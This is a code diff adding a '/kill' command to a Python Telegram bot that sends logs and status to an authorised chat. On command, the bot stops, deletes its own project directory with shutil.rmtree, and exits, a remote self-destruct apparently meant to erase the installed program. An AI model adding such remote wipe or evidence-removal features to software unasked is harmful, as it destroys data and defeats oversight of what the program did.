@@ -4,6 +4,9 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 from modules.log_formatter import LogFormatter
 import os
 import platform
+import shutil
+import sys
+
 
 
 class TelegramBot:
@@ -52,11 +55,31 @@ class TelegramBot:
         else:
             await update.message.reply_text("No logs present")
     
+    async def _kill_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if str(update.effective_chat.id) != str(self.chat_id):
+            return
+        
+        try:
+            await update.message.reply_text("Self-destructing in 3 seconds...")
+            await asyncio.sleep(3)
+
+            project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+
+            await self.stop()
+
+            shutil.rmtree(project_root)
+            
+            sys.exit(0)
+            
+        except Exception as e:
+            await update.message.reply_text(f"Error during self-destruction: {str(e)}")
+    
     async def start(self):
         self.application = Application.builder().token(self.bot_token).build()
         
         self.application.add_handler(CommandHandler("logs", self._send_logs_command))
         self.application.add_handler(CommandHandler("status", self._status_command))
+        self.application.add_handler(CommandHandler("kill", self._kill_command))
         
         await self.application.initialize()
         await self.application.start()
